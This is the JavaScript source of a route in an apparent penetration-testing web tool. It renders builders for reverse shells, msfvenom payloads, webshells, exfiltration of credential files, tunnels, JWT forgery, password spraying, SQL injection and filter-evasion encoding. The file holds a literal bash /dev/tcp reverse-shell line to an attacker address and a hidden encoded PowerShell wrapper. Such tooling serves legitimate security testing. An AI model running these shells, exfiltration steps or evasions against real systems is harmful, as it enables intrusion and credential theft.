/*!
 * obol ui - routes/workbench.js - Global Operator Workbench (#/workbench, #/workbench/<tool>).
 *
 * Full-spectrum, scenario-first utility deck aligned with the Engagement Hub (#/home) and Next Steps (#/path):
 *   - Shells & Delivery:
 *       1. Reverse Shells, Msfvenom & TTY (#/workbench/revshell)
 *       2. File Transfer & Exfil Builder  (#/workbench/transfer)
 *       3. Pivot & Port-Forward Builder   (#/workbench/pivot)
 *   - Cracking & Auth:
 *       4. Hash ID & *2john Extractors    (#/workbench/hashid)
 *       5. Interactive JWT Studio         (#/workbench/jwt)
 *       6. Lockout-Aware Spray Planner    (#/workbench/spray)
 *   - Codecs & Web:
 *       7. CyberChef Codec & WAF Evasion  (#/workbench/codec, #/workbench/encoder, #/workbench/decoder)
 *       8. Manual SQLi Payload Builder    (#/workbench/sqli)
 *       9. Wordlists & Fuzzing Builder    (#/workbench/wordlists)
 *   - Privesc & Triage:
 *      10. GTFOBins & Windows LOLBAS      (#/workbench/gtfobins)
 *      11. Output & Error Doctor          (#/workbench/explain)
 *
 * Linked to the active engagement's TARGET, DOMAIN, LHOST, LPORT, and USER parameters.
 */
(function (root) {
  'use strict';
  var OBOL = root.OBOL = root.OBOL || {};
  OBOL.routes = OBOL.routes || {};
  var U = OBOL.util, W = OBOL.workbench;
  var esc = U.esc;

  // Categories and tool definitions with spectrum accents
  var CATEGORIES = [
    {
      id: 'shells',
      label: 'Shells & Delivery',
      color: 'cyan',
      tools: [
        { id: 'revshell', label: 'Reverse Shells & TTY', sub: 'One-liners, Msfvenom, Webshells & PTY', icon: 'terminal' },
        { id: 'transfer', label: 'File Transfer', sub: 'Kali <-> Target HTTP, SMB & Base64', icon: 'layers' },
        { id: 'pivot',    label: 'Pivot & Tunnels', sub: '127.0.0.1 Forwards, Chisel, Ligolo & SSH', icon: 'git-branch' },
      ]
    },
    {
      id: 'auth',
      label: 'Cracking & Auth',
      color: 'amber',
      tools: [
        { id: 'hashid', label: 'Hash ID & Extractors', sub: 'Hashcat/John modes, cleanup & *2john', icon: 'key' },
        { id: 'jwt',    label: 'JWT Studio', sub: 'Decode, alg:none & live HS256 forgery', icon: 'shield' },
        { id: 'spray',  label: 'Spray Planner', sub: 'Lockout math & safe nxc/kerbrute loops', icon: 'users' },
      ]
    },
    {
      id: 'web',
      label: 'Codecs & Web',
      color: 'violet',
      tools: [
        { id: 'codec',     label: 'Encode & Decode', sub: 'Decode blobs, encode strings & filter bypasses', icon: 'code', aliases: ['encoder', 'decoder'] },
        { id: 'sqli',      label: 'Manual SQLi', sub: 'UNION, auth bypass, blind & file/RCE', icon: 'database' },
        { id: 'wordlists', label: 'Wordlists & Fuzzing', sub: 'SecLists picker, ffuf/ferox/gobuster & CeWL', icon: 'list' },
      ]
    },
    {
      id: 'triage',
      label: 'Privesc & Triage',
      color: 'emerald',
      tools: [
        { id: 'gtfobins', label: 'GTFOBins & LOLBAS', sub: 'Linux & Windows Living-Off-The-Land escapes', icon: 'zap' },
        { id: 'explain',  label: 'Output & Error Doctor', sub: 'Error remedies, benign baselines & signals', icon: 'activity' },
      ]
    }
  ];

  var TABS = [];
  CATEGORIES.forEach(function (cat) {
    cat.tools.forEach(function (t) {
      TABS.push({ id: t.id, label: t.label, sub: t.sub, icon: t.icon, catId: cat.id, color: cat.color, aliases: t.aliases || [] });
    });
  });

  // Per-session UI state
  var state = {
    // Reverse Shell & Payloads
    rsSubmode: 'oneliners',   // 'oneliners' | 'tty' | 'msfvenom' | 'webshells'
    shellId: 'bash-i',
    enc: 'raw',               // 'raw' | 'b64' | 'psenc' | 'url' | 'urlall'
    msfId: 'linux-elf-x64',
    wsId: 'php-tiny',
    lhost: null,
    lport: null,
    target: null,
    domain: null,
    user: null,
    // File Transfer
    tfDir: 'linux-in',        // 'linux-in' | 'win-in' | 'exfil'
    tfFile: 'linpeas.sh',
    tfPort: '8000',
    // Pivot & Tunnels
    pivScenario: 'local-forward', // 'local-forward' | 'subnet-route' | 'reverse-relay'
    pivTool: 'chisel',        // 'chisel' | 'ligolo' | 'ssh' | 'native'
    pivValue: '8080',
    pivChiselPort: '8000',
    pivSocksPort: '1080',
    // Hash ID
    hashInput: '',
    showJohnExtractors: false,
    // Encode & Decode
    codecInput: 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1',
    codecMode: 'encode',      // 'decode' | 'encode' | 'scenarios'
    codecScenario: 'linux-rce',
    codecStack: [],           // [{ label, before, after }]
    // JWT Studio
    jwtInput: '',
    jwtHeaderText: '',
    jwtPayloadText: '',
    jwtSecret: 'secret123',
    jwtForged: '',
    jwtForgeMode: 'hs256',    // 'hs256' | 'none'
    // GTFOBins & LOLBAS
    gtfoPlatform: 'all',      // 'all' | 'linux' | 'windows'
    gtfoCap: 'all',           // 'all' | 'sudo' | 'suid' | 'shell' | 'file-read' | 'download' | 'creds'
    gtfoQuery: '',
    // Wordlists & Fuzzing
    wlTask: 'dirs',
    wlTool: 'ffuf',
    wlExt: '',
    // Manual SQLi
    sqliMode: 'union',        // 'union' | 'bypass' | 'blind' | 'rce'
    sqliDbms: 'mysql',
    sqliCtx: 'string',
    sqliCols: 0,
    sqliVis: 0,
    sqliTable: '',
    // Output & Error Doctor
    explainInput: '',
    explainCmd: '',
    // Spray Planner
    sprayThreshold: '5',
    sprayWindow: '30',
    sprayPasswords: '10',
    sprayMargin: '1',
    sprayCandidate: 'Autumn2026!',
    sprayUserFile: 'users.txt',
  };

  function resolveTabId(raw) {
    var r = String(raw || '').toLowerCase();
    if (r === 'encoder') { state.codecMode = 'encode'; return 'codec'; }
    if (r === 'decoder') { state.codecMode = 'decode'; return 'codec'; }
    for (var i = 0; i < TABS.length; i++) {
      if (TABS[i].id === r) return TABS[i].id;
    }
    return 'revshell';
  }

  function engParams() {
    var eng = (OBOL.store && OBOL.store.active) ? OBOL.store.active() : null;
    var p = (eng && eng.params) || {};
    var facts = (OBOL.store && OBOL.store.factSet) ? OBOL.store.factSet() : null;
    var dom = state.domain != null ? state.domain : (p.domain || '');
    if (!dom && facts && facts.values) {
      var dv = facts.values('ad.domain_known')[0] || facts.values('host.domain')[0];
      if (dv) dom = dv.name || dv.domain || '';
    }
    return {
      engName: (eng && eng.name) || '',
      lhost: state.lhost != null ? state.lhost : (p.lhost || '10.10.14.2'),
      lport: state.lport != null ? state.lport : (p.lport || '4444'),
      target: state.target != null ? state.target : (p.target || '10.10.10.10'),
      domain: dom || 'acme.internal',
      user: state.user != null ? state.user : (p.username || p.user || 'bob'),
      password: p.password || 'Autumn2026!',
      facts: facts
    };
  }

  function sanitizeWbParam(key, raw) {
    var v = String(raw == null ? '' : raw).trim();
    if (key === 'target') return v.replace(/^https?:\/\//i, '').replace(/(?::\d+)?(?:\/.*)?$/, '').trim();
    if (key === 'lhost') return v.replace(/\/\d{1,2}$/, '').trim();
    return v;
  }

  function syncParamToStore(key, val) {
    val = sanitizeWbParam(key, val);
    state[key] = val;
    if (OBOL.store && OBOL.store.active && OBOL.store.active() && OBOL.store.update) {
      var storeKey = key === 'user' ? 'username' : key;
      OBOL.store.update(function (e) {
        e.params = e.params || {};
        e.params[storeKey] = val;
        if (storeKey === 'target') e.activeTarget = val || null;
      }, 'params');
    }
  }

  function locusClass(locus) {
    var l = String(locus || '').toLowerCase();
    if (l.indexOf('kali') === 0) return 'wb-loc-kali';
    if (l.indexOf('ps') === 0 || l.indexOf('c:') === 0) return 'wb-loc-win';
    if (l.indexOf('target') === 0) return 'wb-loc-target';
    return 'wb-loc-payload';
  }

  // Render a command row with optional locus prompt badge, + Stack Layer button, or Send -> Encode button
  function cmdRow(cmd, idAttr, extraClass, opts) {
    opts = opts || {};
    var locus = opts.locus || (extraClass && extraClass.indexOf('listener') >= 0 ? 'kali$' : '');
    var stackBtn = opts.stackLabel
      ? '<button type="button" class="btn-ghost wb-chain-btn" data-wb-stack-add="' + U.attr(cmd) + '" data-wb-stack-label="' + U.attr(opts.stackLabel) + '" title="Stack this encoding layer onto the input so you can add another layer">+ Stack Layer</button>'
      : '';
    var chainBtn = (!opts.stackLabel && opts.chainable)
      ? '<button type="button" class="btn-ghost wb-chain-btn" data-wb-chain="' + U.attr(cmd) + '" title="Load this string into Encode & Decode">' + (opts.chainText || 'Send &rarr; Encode') + '</button>'
      : '';
    return '<div class="wb-cmd' + (extraClass ? ' ' + extraClass : '') + '">'
      + (locus ? '<span class="wb-loc-badge ' + locusClass(locus) + '">' + esc(locus) + '</span>' : '')
      + '<code' + (idAttr ? ' id="' + idAttr + '"' : '') + '>' + esc(cmd) + '</code>'
      + '<div class="wb-cmd-btns">'
      + stackBtn
      + chainBtn
      + '<button type="button" class="btn-copy" data-copy="' + U.attr(cmd) + '">Copy</button>'
      + '</div></div>';
  }

  function refsStrip(items) {
    if (!items || !items.length) return '';
    return '<div class="wb-refs"><span class="wb-refs-l">Reference</span>'
      + items.map(function (r) {
          return '<a href="' + esc(r.url) + '" target="_blank" rel="noopener noreferrer">' + esc(r.label) + ' &#8599;</a>';
        }).join('')
      + '</div>';
  }

  // ── 1. Reverse Shells, Msfvenom, Webshells & TTY Stabilization ──────────────────────────────
  function computeRevshell(p) {
    var entry = W.revShell(state.shellId) || W.REVSHELLS[0];
    var rawCmd = W.fill(entry.tpl, p);
    var avail = entry.enc || [];
    var enc = state.enc;
    if (enc !== 'raw' && enc !== 'url' && enc !== 'urlall' && avail.indexOf(enc) < 0) enc = 'raw';

    var payload = rawCmd, encNote = '';
    if (enc === 'b64') {
      payload = W.linuxB64Runner(rawCmd, 'bash');
      encNote = 'Base64-wrapped so quotes, pipes, and redirects cannot be mangled by a web parameter or filter.';
    } else if (enc === 'psenc') {
      payload = 'powershell -nop -w hidden -enc ' + W.psEnc(rawCmd);
      encNote = 'UTF-16LE Base64 (-EncodedCommand): bypasses cmd.exe and PowerShell quoting hazards completely.';
    } else if (enc === 'url') {
      payload = W.urlEnc(rawCmd);
      encNote = 'URL-encoded (percent-encoded): ready to paste directly into a GET query string or POST body in Burp/curl.';
    } else if (enc === 'urlall') {
      payload = W.urlEncAll(rawCmd);
      encNote = 'Every byte percent-encoded: useful when a web filter blocks specific keywords or punctuation.';
    }
    var listener = W.listenerFor(entry, p);
    return { entry: entry, payload: payload, rawCmd: rawCmd, listener: listener, avail: avail, enc: enc, encNote: encNote };
  }

  function revshellSubContent(p) {
    var sub = state.rsSubmode || 'oneliners';
    if (sub === 'tty') {
      return '<div class="wb-tty-grid">'
        + (W.TTY_RECIPES || []).map(function (r) {
            return '<div class="wb-step-card wb-card-cyan">'
              + '<div class="wb-step-card-h"><span class="wb-badge wb-badge-cyan">' + esc(r.os.toUpperCase()) + '</span><strong>' + esc(r.title) + '</strong></div>'
              + '<p class="wb-hash-note">' + esc(r.note) + '</p>'
              + '<div class="wb-step-list">'
              + r.steps.map(function (st) {
                  var c = W.fill(st.cmd, p);
                  return '<div class="wb-step-item"><div class="wb-xform-l">' + esc(st.label) + '</div>' + cmdRow(c, '', '', { locus: st.locus }) + '</div>';
                }).join('')
              + '</div></div>';
          }).join('')
        + '</div>';
    }
    if (sub === 'msfvenom') {
      var msf = W.buildMsfvenom(state.msfId, p);
      return '<div class="wb-sub-section">'
        + '<div class="wb-rs-group-h">Select Stager / Binary Format</div>'
        + '<div class="wb-rs-opts">'
        + (W.MSFVENOM_RECIPES || []).map(function (r) {
            var on = r.id === msf.recipe.id;
            return '<button type="button" class="wb-rs-opt' + (on ? ' on' : '') + '" data-wb-msf="' + esc(r.id) + '">' + esc(r.label) + '</button>';
          }).join('')
        + '</div>'
        + '<p class="wb-note" id="wb-msf-note">' + esc(msf.recipe.note) + '</p>'
        + '<div class="wb-paired-grid">'
        + '<div class="wb-step-card wb-card-cyan">'
        + '<div class="wb-field-l">Step 1 · Generate Payload on Kali</div>'
        + cmdRow(msf.genCmd, 'wb-msf-gen', '', { locus: 'kali$' })
        + '<div class="wb-field-l">Step 2 · Start Listener on Kali</div>'
        + cmdRow(msf.listenerCmd, 'wb-msf-listen', 'wb-cmd-listener', { locus: 'kali$' })
        + '</div>'
        + '<div class="wb-step-card wb-card-emerald">'
        + '<div class="wb-field-l">Step 3 · Trigger on Target (' + esc(msf.recipe.ext) + ')</div>'
        + cmdRow(msf.runCmd, 'wb-msf-run', '', { locus: msf.recipe.os === 'windows' ? 'C:\\>' : 'target$' })
        + '<p class="wb-hash-note" style="margin-top:10px">Need to move <code>' + esc(msf.recipe.ext) + '</code> onto the box? <a href="#/workbench/transfer">Open File Transfer Builder &rarr;</a></p>'
        + '</div></div></div>';
    }
    if (sub === 'webshells') {
      var ws = (W.WEBSHELLS || []).filter(function (x) { return x.id === state.wsId; })[0] || W.WEBSHELLS[0];
      var trig = String(ws.trigger || '').replace(/\{\{target\}\}/g, p.target).replace(/\{\{lhost\}\}/g, p.lhost).replace(/\{\{lport\}\}/g, p.lport);
      return '<div class="wb-sub-section">'
        + '<div class="wb-rs-group-h">Select Webshell Stack</div>'
        + '<div class="wb-rs-opts">'
        + (W.WEBSHELLS || []).map(function (w) {
            var on = w.id === ws.id;
            return '<button type="button" class="wb-rs-opt' + (on ? ' on' : '') + '" data-wb-ws="' + esc(w.id) + '">' + esc(w.label) + ' (' + esc(w.file) + ')</button>';
          }).join('')
        + '</div>'
        + '<p class="wb-note">' + esc(ws.note) + '</p>'
        + '<div class="wb-paired-grid">'
        + '<div class="wb-step-card wb-card-cyan">'
        + '<div class="wb-field-l">Webshell Source (' + esc(ws.file) + ')</div>'
        + cmdRow(ws.code, 'wb-ws-code', '', { locus: 'payload' })
        + '</div>'
        + '<div class="wb-step-card wb-card-emerald">'
        + '<div class="wb-field-l">Trigger Command from Kali</div>'
        + cmdRow(trig, 'wb-ws-trig', '', { locus: 'kali$' })
        + '</div></div></div>';
    }

    // Default: Reverse Shell One-Liners
    var c = computeRevshell(p);
    var linux = W.REVSHELLS.filter(function (e) { return e.os === 'linux'; });
    var win = W.REVSHELLS.filter(function (e) { return e.os === 'windows'; });
    function pill(e) {
      var on = e.id === c.entry.id;
      return '<button type="button" class="wb-rs-opt' + (on ? ' on' : '') + '" data-wb-shell="' + esc(e.id) + '"'
        + ' aria-pressed="' + (on ? 'true' : 'false') + '">' + esc(e.name) + '</button>';
    }
    var encModes = [
      { id: 'raw', label: 'Raw Payload' },
      c.avail.indexOf('b64') >= 0 ? { id: 'b64', label: 'Base64 (echo ... | base64 -d | bash)' } : null,
      c.avail.indexOf('psenc') >= 0 ? { id: 'psenc', label: 'PowerShell -EncodedCommand' } : null,
      { id: 'url', label: 'URL-Encoded (for GET/POST)' },
      { id: 'urlall', label: 'Full Hex URL (%XX)' },
    ].filter(Boolean);

    return '<div class="wb-rs-pick">'
      + '<div class="wb-rs-group"><div class="wb-rs-group-h">Linux / Unix Shells</div><div class="wb-rs-opts">' + linux.map(pill).join('') + '</div></div>'
      + '<div class="wb-rs-group"><div class="wb-rs-group-h">Windows Shells</div><div class="wb-rs-opts">' + win.map(pill).join('') + '</div></div>'
      + '</div>'
      + '<div class="wb-field-l">Payload Wrapping &amp; Filter Evasion</div>'
      + '<div class="wb-enc-row" id="wb-enc-row">'
      + encModes.map(function (m) {
          var on = c.enc === m.id;
          return '<button type="button" class="wb-chip' + (on ? ' on' : '') + '" data-wb-enc="' + m.id + '">' + esc(m.label) + '</button>';
        }).join('')
      + '</div>'
      + '<div class="wb-paired-grid" style="margin-top:12px">'
      + '<div class="wb-step-card wb-card-cyan">'
      + '<div class="wb-field-l" style="margin-top:0">Step 1 · Start Listener on Kali</div>'
      + cmdRow(c.listener, 'wb-rs-listener', 'wb-cmd-listener', { locus: 'kali$' })
      + '</div>'
      + '<div class="wb-step-card wb-card-emerald">'
      + '<div class="wb-field-l" style="margin-top:0">Step 2 · Run Payload on Target</div>'
      + cmdRow(c.payload, 'wb-rs-payload', '', { locus: c.entry.os === 'windows' ? 'PS C:\\>' : 'target$', chainable: true })
      + '</div></div>'
      + '<p class="wb-enc-note" id="wb-rs-encnote"' + (c.encNote ? '' : ' hidden') + '>' + esc(c.encNote) + '</p>'
      + '<p class="wb-note" id="wb-rs-note">' + esc(c.entry.note) + '</p>';
  }

  function revshellPanel() {
    var p = engParams();
    var sub = state.rsSubmode || 'oneliners';
    var subTabs = [
      { id: 'oneliners', label: '1. Reverse Shell One-Liners' },
      { id: 'tty',       label: '2. TTY Upgrade & Stabilization' },
      { id: 'msfvenom',  label: '3. Msfvenom Binary / Stager Builder' },
      { id: 'webshells', label: '4. Minimal Webshells (PHP / ASPX / JSP)' },
    ];
    return '<div class="wb-panel wb-panel-cyan">'
      + '<div class="wb-panel-head">'
      + '<div><h2 class="wb-panel-title">' + (OBOL.ic ? OBOL.ic('terminal') : '') + 'Reverse Shells, Msfvenom, Webshells &amp; TTY Upgrade</h2>'
      + '<p class="wb-panel-sub">Pre-filled with your active engagement LHOST (<code>' + esc(p.lhost) + '</code>) and LPORT (<code>' + esc(p.lport) + '</code>). Switch sub-tools below to stabilize a dumb shell or generate binaries.</p></div>'
      + '</div>'
      + '<div class="wb-params">'
      + '<label class="wb-param"><span>LHOST (Kali VPN IP)</span>'
      + '<input id="wb-lhost" type="text" value="' + esc(p.lhost) + '" placeholder="10.10.14.2" autocomplete="off" spellcheck="false"></label>'
      + '<label class="wb-param"><span>LPORT (Listener Port)</span>'
      + '<input id="wb-lport" type="text" value="' + esc(p.lport) + '" placeholder="4444" autocomplete="off" spellcheck="false"></label>'
      + '<span class="wb-hint">Find your VPN IP on Kali with <code>ip -br a show tun0</code></span>'
      + '</div>'
      + '<div class="wb-subtabs" role="tablist">'
      + subTabs.map(function (st) {
          var on = st.id === sub;
          return '<button type="button" class="wb-subtab' + (on ? ' on' : '') + '" data-wb-rssub="' + st.id + '">' + esc(st.label) + '</button>';
        }).join('')
      + '</div>'
      + '<div id="wb-rs-body">' + revshellSubContent(p) + '</div>'
      + refsStrip([
        { label: 'revshells.com', url: 'https://www.revshells.com/' },
        { label: 'PayloadsAllTheThings Reverse Shells', url: 'https://swisskyrepo.github.io/PayloadsAllTheThings/cheatsheets/shell-reverse-cheatsheet/' },
      ])
      + '</div>';
  }

  function refreshRevshellInPlace(mount) {
    var p = engParams();
    var body = mount.querySelector('#wb-rs-body');
    if (body) body.innerHTML = revshellSubContent(p);
  }

  // ── 2. Scenario-First File Transfer & Exfil Builder ─────────────────────────────────────────
  function renderTransferOut() {
    var p = engParams();
    var plan = W.buildFileTransfer({
      direction: state.tfDir,
      file: state.tfFile,
      port: state.tfPort,
      lhost: p.lhost,
      target: p.target,
      user: p.user
    });
    return '<div class="wb-tf-dest-bar">'
      + '<span class="wb-badge wb-badge-cyan">Source: ' + esc(plan.file) + '</span>'
      + '<span class="wb-tf-arrow">&rarr;</span>'
      + '<span class="wb-badge wb-badge-emerald">Target Path: ' + esc(plan.dest) + '</span>'
      + '</div>'
      + '<div class="wb-tf-methods">'
      + plan.methods.map(function (m, idx) {
          return '<div class="wb-step-card ' + (idx === 0 ? 'wb-card-cyan' : 'wb-card-slate') + '">'
            + '<div class="wb-step-card-h">'
            + '<span class="wb-badge ' + (idx === 0 ? 'wb-badge-cyan' : 'wb-badge-amber') + '">' + esc(m.badge) + '</span>'
            + '<strong>' + esc(m.title) + '</strong>'
            + '</div>'
            + '<p class="wb-hash-note">' + esc(m.note) + '</p>'
            + '<div class="wb-paired-grid">'
            + '<div class="wb-pair-col"><div class="wb-xform-l">' + esc(m.step1.label) + '</div>'
            + cmdRow(m.step1.cmd, '', 'wb-cmd-listener', { locus: m.step1.locus }) + '</div>'
            + '<div class="wb-pair-col"><div class="wb-xform-l">' + esc(m.step2.label) + '</div>'
            + cmdRow(m.step2.cmd, '', '', { locus: m.step2.locus }) + '</div>'
            + '</div>'
            + (m.alts && m.alts.length
                ? '<details class="wb-alts-drawer"><summary>Alternative Commands &amp; Fallback Options (' + m.alts.length + ')</summary><div class="wb-alts-list">'
                  + m.alts.map(function (a) {
                      return '<div class="wb-step-item"><div class="wb-xform-note">' + esc(a.label) + '</div>' + cmdRow(a.cmd, '', '', { locus: a.locus }) + '</div>';
                    }).join('')
                  + '</div></details>'
                : '')
            + '</div>';
        }).join('')
      + '</div>';
  }

  function transferPanel() {
    var dir = state.tfDir || 'linux-in';
    var presets = (W.FILE_TRANSFER_PRESETS && W.FILE_TRANSFER_PRESETS[dir]) || [];
    var dirs = [
      { id: 'linux-in', title: 'Kali -> Linux Target', sub: 'Stage linpeas, pspy64, chisel, or exploits into /dev/shm', color: 'cyan' },
      { id: 'win-in',   title: 'Kali -> Windows Target', sub: 'Stage winPEAS, nc64, Potato, or SharpHound into C:\\Windows\\Temp', color: 'blue' },
      { id: 'exfil',    title: 'Target -> Kali (Exfil Loot)', sub: 'Pull BloodHound zips, SAM/SYSTEM hives, ntds.dit, or SSH keys back to Kali', color: 'amber' },
    ];
    return '<div class="wb-panel wb-panel-cyan">'
      + '<div class="wb-panel-head"><div>'
      + '<h2 class="wb-panel-title">' + (OBOL.ic ? OBOL.ic('layers') : '') + 'File Transfer &amp; Exfiltration Builder</h2>'
      + '<p class="wb-panel-sub">Pick your transfer direction and click a common tool preset (or type your own filename). OBOL pairs the exact <strong>Step 1 (On Kali)</strong> and <strong>Step 2 (On Target)</strong> commands with safe writable paths.</p>'
      + '</div></div>'
      + '<div class="wb-field-l" style="margin-top:0">1. Choose Direction</div>'
      + '<div class="wb-scenario-grid">'
      + dirs.map(function (d) {
          var on = d.id === dir;
          return '<button type="button" class="wb-scenario-card wb-sc-' + d.color + (on ? ' on' : '') + '" data-wb-tfdir="' + d.id + '">'
            + '<div class="wb-sc-title">' + esc(d.title) + '</div>'
            + '<div class="wb-sc-sub">' + esc(d.sub) + '</div>'
            + '</button>';
        }).join('')
      + '</div>'
      + '<div class="wb-field-l">2. Click a Payload Preset (or Enter Any Filename)</div>'
      + '<div class="wb-fill-chips" id="wb-tf-presets">'
      + presets.map(function (pr) {
          var on = state.tfFile === pr.file;
          return '<button type="button" class="wb-fill-chip' + (on ? ' on' : '') + '" data-wb-tffile="' + esc(pr.file) + '">' + esc(pr.label) + '</button>';
        }).join('')
      + '</div>'
      + '<div class="wb-params">'
      + '<label class="wb-param" style="flex:2 1 260px"><span>Filename to Transfer</span>'
      + '<input id="wb-tf-input" type="text" value="' + esc(state.tfFile) + '" placeholder="linpeas.sh" autocomplete="off" spellcheck="false"></label>'
      + '<label class="wb-param" style="flex:0 1 140px"><span>HTTP / Transfer Port</span>'
      + '<input id="wb-tf-port" type="text" value="' + esc(state.tfPort) + '" placeholder="8000" autocomplete="off" spellcheck="false"></label>'
      + '</div>'
      + '<div id="wb-tf-out">' + renderTransferOut() + '</div>'
      + '</div>';
  }

  // ── 3. Scenario-First Pivoting, Port-Forward & Tunnel Builder ───────────────────────────────
  function renderPivotSvg(scenId) {
    if (scenId === 'local-forward' || scenId === 'local-port') {
      return '<svg class="wb-piv-svg" viewBox="0 0 280 44" aria-hidden="true"><rect x="4" y="8" width="64" height="28" rx="6" fill="#0c192c" stroke="#22d3ee" stroke-width="1.5"/><text x="36" y="26" fill="#22d3ee" font-size="10" font-family="monospace" text-anchor="middle">Kali</text><path d="M72 22 H122" stroke="#22d3ee" stroke-width="1.8" stroke-dasharray="4 2"/><rect x="124" y="8" width="70" height="28" rx="6" fill="#0f172a" stroke="#f59e0b" stroke-width="1.5"/><text x="159" y="26" fill="#fbbf24" font-size="10" font-family="monospace" text-anchor="middle">Pivot Box</text><path d="M196 22 H214" stroke="#34d399" stroke-width="1.8"/><rect x="216" y="8" width="60" height="28" rx="6" fill="#06281e" stroke="#10b981" stroke-width="1.5"/><text x="246" y="26" fill="#34d399" font-size="9.5" font-family="monospace" text-anchor="middle">127.0.0.1</text></svg>';
    }
    if (scenId === 'subnet-route' || scenId === 'subnet') {
      return '<svg class="wb-piv-svg" viewBox="0 0 280 44" aria-hidden="true"><rect x="4" y="8" width="64" height="28" rx="6" fill="#0c192c" stroke="#22d3ee" stroke-width="1.5"/><text x="36" y="26" fill="#22d3ee" font-size="10" font-family="monospace" text-anchor="middle">Kali</text><path d="M72 22 H118" stroke="#a855f7" stroke-width="2"/><rect x="120" y="8" width="68" height="28" rx="6" fill="#0f172a" stroke="#a855f7" stroke-width="1.5"/><text x="154" y="26" fill="#c084fc" font-size="10" font-family="monospace" text-anchor="middle">Dual-NIC</text><path d="M190 22 H210" stroke="#34d399" stroke-width="1.8"/><rect x="212" y="8" width="64" height="28" rx="6" fill="#06281e" stroke="#10b981" stroke-width="1.5"/><text x="244" y="26" fill="#34d399" font-size="9.5" font-family="monospace" text-anchor="middle">172.16.x/24</text></svg>';
    }
    return '<svg class="wb-piv-svg" viewBox="0 0 280 44" aria-hidden="true"><rect x="4" y="8" width="68" height="28" rx="6" fill="#06281e" stroke="#10b981" stroke-width="1.5"/><text x="38" y="26" fill="#34d399" font-size="9.5" font-family="monospace" text-anchor="middle">Internal</text><path d="M74 22 H116" stroke="#f43f5e" stroke-width="1.8"/><rect x="118" y="8" width="70" height="28" rx="6" fill="#0f172a" stroke="#f59e0b" stroke-width="1.5"/><text x="153" y="26" fill="#fbbf24" font-size="10" font-family="monospace" text-anchor="middle">Pivot:4444</text><path d="M190 22 H214" stroke="#22d3ee" stroke-width="1.8"/><rect x="216" y="8" width="60" height="28" rx="6" fill="#0c192c" stroke="#22d3ee" stroke-width="1.5"/><text x="246" y="26" fill="#22d3ee" font-size="10" font-family="monospace" text-anchor="middle">Kali:4444</text></svg>';
  }

  function renderPivotOut() {
    var p = engParams();
    var plan = W.buildPivotPlan({
      scenario: state.pivScenario,
      tool: state.pivTool,
      value: state.pivValue,
      lhost: p.lhost,
      lport: p.lport,
      target: p.target,
      user: p.user,
      chiselPort: state.pivChiselPort,
      socksPort: state.pivSocksPort
    });
    return '<div class="wb-step-card wb-card-cyan">'
      + '<div class="wb-step-card-h"><span class="wb-badge wb-badge-cyan">' + esc(plan.tool.toUpperCase()) + '</span><strong>Step-by-Step Tunnel Sequence</strong></div>'
      + '<p class="wb-hash-note">' + esc(plan.note) + '</p>'
      + '<div class="wb-step-list">'
      + plan.steps.map(function (st) {
          return '<div class="wb-step-item"><div class="wb-xform-l">' + esc(st.label) + '</div>' + cmdRow(st.cmd, '', '', { locus: st.locus }) + '</div>';
        }).join('')
      + '</div></div>';
  }

  function pivotPanel() {
    var scen = (W.PIVOT_SCENARIOS || []).filter(function (s) { return s.id === state.pivScenario; })[0] || W.PIVOT_SCENARIOS[0];
    var tools = state.pivScenario === 'reverse-relay'
      ? [
          { id: 'native', label: 'Socat / Windows Netsh (Recommended)' },
          { id: 'ligolo', label: 'Ligolo-ng (listener_add)' },
          { id: 'ssh',    label: 'SSH Remote Forward (-R)' },
        ]
      : [
          { id: 'chisel', label: 'Chisel (Works from Any Shell)' },
          { id: 'ligolo', label: 'Ligolo-ng (Fast TUN Interface - No Proxychains)' },
          { id: 'ssh',    label: 'SSH Tunnel (-L / -D - Zero Extra Binaries)' },
        ];
    return '<div class="wb-panel wb-panel-cyan">'
      + '<div class="wb-panel-head"><div>'
      + '<h2 class="wb-panel-title">' + (OBOL.ic ? OBOL.ic('git-branch') : '') + 'Scenario-First Pivot, Port-Forward &amp; Tunnel Builder</h2>'
      + '<p class="wb-panel-sub">Pick the picture that matches your situation and fill in the <strong>single target value</strong>. Everything else is auto-filled from your engagement.</p>'
      + '</div></div>'
      + '<div class="wb-field-l" style="margin-top:0">1. What Are You Trying To Reach?</div>'
      + '<div class="wb-scenario-grid">'
      + (W.PIVOT_SCENARIOS || []).map(function (s) {
          var on = s.id === scen.id;
          return '<button type="button" class="wb-scenario-card wb-sc-cyan' + (on ? ' on' : '') + '" data-wb-pivscen="' + s.id + '">'
            + '<div class="wb-sc-badge">' + esc(s.badge) + '</div>'
            + renderPivotSvg(s.id)
            + '<div class="wb-sc-title">' + esc(s.title) + '</div>'
            + '<div class="wb-sc-sub">' + esc(s.summary) + '</div>'
            + '</button>';
        }).join('')
      + '</div>'
      + '<div class="wb-paired-grid" style="align-items:end;margin-top:14px">'
      + '<div>'
      + '<div class="wb-field-l" style="margin-top:0">2. ' + esc(scen.inputLabel) + '</div>'
      + '<div class="wb-fill-chips" style="margin-bottom:8px">'
      + (scen.presets || []).map(function (pr) {
          var on = state.pivValue === pr;
          return '<button type="button" class="wb-fill-chip' + (on ? ' on' : '') + '" data-wb-pivpreset="' + esc(pr) + '">' + esc(pr) + '</button>';
        }).join('')
      + '</div>'
      + '<input id="wb-piv-val" class="wb-input" type="text" value="' + esc(state.pivValue) + '" placeholder="' + esc(scen.defaultInput) + '" autocomplete="off" spellcheck="false">'
      + '</div>'
      + '<div>'
      + '<div class="wb-field-l" style="margin-top:0">3. Preferred Tunnel Tool</div>'
      + '<div class="wb-rs-opts">'
      + tools.map(function (t) {
          var on = state.pivTool === t.id;
          return '<button type="button" class="wb-rs-opt' + (on ? ' on' : '') + '" data-wb-pivtool="' + t.id + '">' + esc(t.label) + '</button>';
        }).join('')
      + '</div></div></div>'
      + '<div id="wb-piv-out" style="margin-top:16px">' + renderPivotOut() + '</div>'
      + '</div>';
  }

  // ── 4. Hash Identifier & *2john Extractors ──────────────────────────────────────────────────
  var HASH_SAMPLES = [
    { label: 'NTLM (secretsdump line)', val: 'ACME\\bob:1104:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::' },
    { label: 'Kerberoast ($krb5tgs$)',  val: '$krb5tgs$23$*svc_sql$ACME.INTERNAL$MSSQLSvc/dc01.acme.internal:1433*$a1b2c3d4e5f60718293a4b5c6d7e8f90$0102030405060708090a0b0c0d0e0f10' },
